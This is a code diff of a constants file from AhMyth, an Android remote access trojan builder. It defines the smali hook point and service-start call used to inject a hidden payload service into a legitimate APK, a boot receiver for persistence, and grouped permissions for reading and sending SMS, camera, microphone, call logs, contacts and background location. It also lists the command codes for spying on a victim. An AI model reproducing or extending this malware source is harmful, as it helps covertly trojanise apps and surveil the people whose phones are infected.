@@ -9,65 +9,135 @@ exports.ahmythApkFolderPath = path.join(__dirname, '..', '..', 'Factory/Ahmyth')
 exports.vaultFolderPath = path.join(__dirname, '..', '..', 'Factory/Vault').replace("app.asar", "app.asar.unpacked");
 exports.apktoolJar = path.join(__dirname, '..', '..', 'Factory/apktool.jar').replace("app.asar", "app.asar.unpacked");
 exports.signApkJar = path.join(__dirname, '..', '..', 'Factory/sign.jar').replace("app.asar", "app.asar.unpacked");
-exports.maskUrlPython = path.join(__dirname, '..', '..', 'Factory/maskUrl.py').replace("app.asar", "app.asar.unpacked");
 exports.dataDir = 'AhMyth'
 exports.downloadPath = 'Downloads';
 exports.outputApkPath = 'Output';
 exports.outputLogsPath = 'Logs';
-exports.logColors = { RED: "red",  GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
+exports.logColors = { RED: "red", GREEN: "lime", YELLOW: "yellow", DEFAULT: "#82eefd" };
 exports.logStatus = { SUCCESS: 1, FAIL: 0, INFO: 2 };
 exports.defaultPort = 42474;
-exports.IOSocketPath = 'smali/ahmyth/mine/king/ahmyth/e.smali';
-exports.ahmythService = '<service android:enabled="true" android:exported="false" android:name="ahmyth.mine.king.ahmyth.MainService"/>';
-exports.ahmythReciver = '<receiver android:enabled="true" android:exported="true" android:name="ahmyth.mine.king.ahmyth.MyReceiver">' +
-    '<intent-filter>' +
-    '<action android:name="android.intent.action.BOOT_COMPLETED"/>' +
-    '</intent-filter>' +
-    '</receiver>';
+exports.IOSocketPath = 'smali' + path.sep + 'ahmyth' + path.sep + 'mine' + path.sep + 'king' + path.sep + 'ahmyth' + path.sep + 'e.smali';
+exports.ahmythService = 'ahmyth.mine.king.ahmyth.MainService';
+exports.ahmythReceiver = 'ahmyth.mine.king.ahmyth.MyReceiver';
 exports.serviceSrc = 'invoke-static {}, Lahmyth/mine/king/ahmyth/MainService'
 exports.serviceStart = ';->start()V \n\n' +
-'    return-void';
+  '    return-void';
 exports.hookPoint = 'return-void';
 exports.permissions = [
-    '<uses-permission android:name="android.permission.WAKE_LOCK"/>',
-    '<uses-permission android:name="android.permission.CAMERA"/>',
-    '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>',
-    '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
-    '<uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>',
-    '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
-    '<uses-permission android:name="android.permission.WRITE_SECURE_SETTINGS"/>',
-    '<uses-permission android:name="android.permission.INTERNET"/>',
-    '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
-    '<uses-permission android:name="android.permission.READ_SMS"/>',
-    '<uses-permission android:name="android.permission.SEND_SMS"/>',
-    '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
-    '<uses-permission android:name="android.permission.WRITE_SMS"/>',
-    '<uses-feature android:name="android.hardware.camera"/>',
-    '<uses-feature android:name="android.hardware.camera.autofocus"/>',
-    '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
-    '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
-    '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
-    '<uses-permission android:name="android.permission.PROCESS_OUTGOING_CALLS"/>',
-    '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
-    '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
-    '<uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS"/>',
-    '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
-    '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
-    '<uses-permission android:name="android.permission.ACCESS_BACKGROUND_LOCATION"/>',
-    '<uses-permission android:name="android.permission.INSTALL_PACKAGE"/>'
-]
-
-
+  'android.permission.WAKE_LOCK',
+  'android.permission.CAMERA',
+  'android.permission.READ_EXTERNAL_STORAGE',
+  'android.permission.WRITE_EXTERNAL_STORAGE',
+  'android.permission.MANAGE_EXTERNAL_STORAGE',
+  'android.permission.WRITE_SETTINGS',
+  'android.permission.WRITE_SECURE_SETTINGS',
+  'android.permission.INTERNET',
+  'android.permission.ACCESS_NETWORK_STATE',
+  'android.permission.READ_SMS',
+  'android.permission.SEND_SMS',
+  'android.permission.RECEIVE_SMS',
+  'android.permission.WRITE_SMS',
+  'android.hardware.camera',
+  'android.hardware.camera.autofocus',
+  'android.permission.RECEIVE_BOOT_COMPLETED',
+  'android.permission.READ_PHONE_STATE',
+  'android.permission.READ_CALL_LOG',
+  'android.permission.PROCESS_OUTGOING_CALLS',
+  'android.permission.READ_CONTACTS',
+  'android.permission.RECORD_AUDIO',
+  'android.permission.MODIFY_AUDIO_SETTINGS',
+  'android.permission.ACCESS_FINE_LOCATION',
+  'android.permission.ACCESS_COARSE_LOCATION',
+  'android.permission.ACCESS_BACKGROUND_LOCATION',
+  'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+];
+exports.checkboxMap = {
+  Permissions1: [
+    'android.permission.CAMERA',
+    'android.hardware.camera',
+    'android.hardware.camera.autofocus',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+  Permissions2: [
+    'android.permission.READ_EXTERNAL_STORAGE',
+    'android.permission.WRITE_EXTERNAL_STORAGE',
+    'android.permission.MANAGE_EXTERNAL_STORAGE',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+  Permissions3: [
+    'android.permission.RECORD_AUDIO',
+    'android.permission.MODIFY_AUDIO_SETTINGS',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+  Permissions4: [
+    'android.permission.ACCESS_FINE_LOCATION',
+    'android.permission.ACCESS_COARSE_LOCATION',
+    'android.permission.ACCESS_BACKGROUND_LOCATION',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+  Permissions5: [
+    'android.permission.READ_CONTACTS',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+  Permissions6: [
+    'android.permission.READ_SMS',
+    'android.permission.SEND_SMS',
+    'android.permission.RECEIVE_SMS',
+    'android.permission.WRITE_SMS',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+  Permissions7: [
+    'android.permission.READ_PHONE_STATE',
+    'android.permission.READ_CALL_LOG',
+    'android.permission.PROCESS_OUTGOING_CALLS',
+    'android.permission.WAKE_LOCK',
+    'android.permission.WRITE_SETTINGS',
+    'android.permission.WRITE_SECURE_SETTINGS',
+    'android.permission.INTERNET',
+    'android.permission.ACCESS_NETWORK_STATE',
+    'android.permission.REQUEST_IGNORE_BATTERY-OPTIMISATION'
+  ],
+};
 
 //---------------------Lab Controller Vars----------------------------------
 exports.order = 'order';
 exports.orders = {
-    camera: 'x0000ca',
-    fileManager: 'x0000fm',
-    calls: 'x0000cl',
-    sms: 'x0000sm',
-    mic: 'x0000mc',
-    location: 'x0000lm',
-    contacts: 'x0000cn',
+  camera: 'x0000ca',
+  fileManager: 'x0000fm',
+  calls: 'x0000cl',
+  sms: 'x0000sm',
+  mic: 'x0000mc',
+  location: 'x0000lm',
+  contacts: 'x0000cn',
 
 }
